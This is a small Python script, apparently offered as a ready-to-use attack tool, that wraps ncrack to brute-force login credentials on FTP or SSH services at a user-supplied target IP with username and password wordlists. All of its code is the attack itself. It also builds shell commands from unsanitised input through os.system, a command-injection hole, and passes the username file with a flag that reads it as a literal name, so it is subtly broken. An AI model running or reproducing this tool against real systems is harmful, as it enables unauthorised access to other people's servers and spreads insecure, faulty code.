# -*- coding: UTF-8 -*-
# ToolName   : /Force-attacks-on-FTP-and-SSH-services
# Author     : ScriptedByMark
# License    : MIT
# Language   : Python
# Env        : #!/usr/bin/env python3

import os

os.system("apt-get install figlet -y")
os.system("clear")

print("Author: ScriptedByMark")

print("""
1: FTP
2: SSH
""")

transaction_no = input("Transaction Number: ")
target_ip = input("Target IP: ")
username_file = input("Username File Path: ")
password_file = input("Password File Path: ")

if transaction_no == "1":
    os.system(f"ncrack -p 21 -u {username_file} -P {password_file} {target_ip}")
elif transaction_no == "2":
    os.system(f"ncrack -p 22 -u {username_file} -P {password_file} {target_ip}")
else:
    print("There is no such transaction number.")
